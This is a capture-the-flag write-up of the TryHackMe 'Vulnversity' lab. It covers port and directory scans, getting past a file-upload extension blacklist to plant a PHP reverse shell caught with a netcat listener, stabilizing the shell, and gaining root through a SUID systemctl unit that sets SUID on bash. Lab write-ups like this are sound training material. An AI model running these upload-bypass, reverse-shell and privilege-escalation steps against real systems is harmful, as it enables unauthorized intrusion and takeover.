# TryHackMe-Vulnversity

>Abdullah Rizwan | 15th September , 08 : 29 PM

#NMAP

```
nmap -sC -sV $IP
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 20:30 EDT                                                                              [11/18]
Nmap scan report for 10.10.233.54                                                                                                                   
Host is up (0.17s latency).                                               
Not shown: 994 closed ports                                               
PORT     STATE SERVICE     VERSION                                                                                                                  
21/tcp   open  ftp         vsftpd 3.0.3                                                                                                             
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                             
| ssh-hostkey:                                                            
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)                                                                                      
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)                                                                                     
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)                                                                                   
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                              
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)                                                                          
3128/tcp open  http-proxy  Squid http proxy 3.5.12                        
|_http-server-header: squid/3.5.12                                        
|_http-title: ERROR: The requested URL could not be retrieved                                                                                       
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))                                                                                           
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                        
|_http-title: Vuln University                                             
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                
                                                                          
Host script results:                 
|_clock-skew: mean: -7h39m58s, deviation: 2h18m34s, median: -8h59m59s                                                                               
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                   
| smb-os-discovery:                  
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)                                                                                                           
|   Computer name: vulnuniversity                                                                                                                   
|   NetBIOS computer name: VULNUNIVERSITY\x00                             
|   Domain name: \x00                
|   FQDN: vulnuniversity             
|_  System time: 2020-09-15T11:30:49-04:00                                
| smb-security-mode:                 
|   account_used: guest              
|   authentication_level: user                                            
|   challenge_response: supported      
|_  message_signing: disabled (dangerous, but default)                                                                                              
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2020-09-15T15:30:50                                             
|_  start_date: N/A                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 45.13 seconds                            
````

## Dirbuster

```
gobuster dir -u http://10.10.233.54:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.233.54:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 20:40:18 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
```

`/internal` is a page where we can upload an image and through `/images` we can view it.

## Burpsuite

Now we can not upload a php reverse shell due to it's extension is not allowed so we can make wordlist of possible php extension to by pass blacklist

```
.php
.php3
.php4
.php5
.phphtml
.phpgif
.gifphp
```

`.phtml` is the only extension that is accepted so we are going to change our reverse shell's extension and then upload and set a net cat listener on our terminal 

```
nc -lvp 5555

```

And access the reverse shell on the web server 

```
http://10.10.233.54:3333/internal/uploads/php-reverse-shell.phtml
```

## Stabilize Shell

First get a bash with  `python -c 'import pty; pty.spawn("/bin/bash")'` Then

1. ctrl+z
2. stty raw -echo
3. type fg and press enter x2.

You will get a stabilize shell with auto tab complete and then `export TERM=xterm ` for using clear command.


## Privilege Escalation

Now we have to find a file which has SUID means which can set SUID permissions so we can issue a command to find these files

`find / -perm /4000`

And we will find `sytemctl` which can set SUID 

Now search for systemctl on `GTFOBINS` and slightly modifying the command `chmod +s /bin/bash` it will set SUID on bash to run as root

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Now run the command `bash-p` You will be root.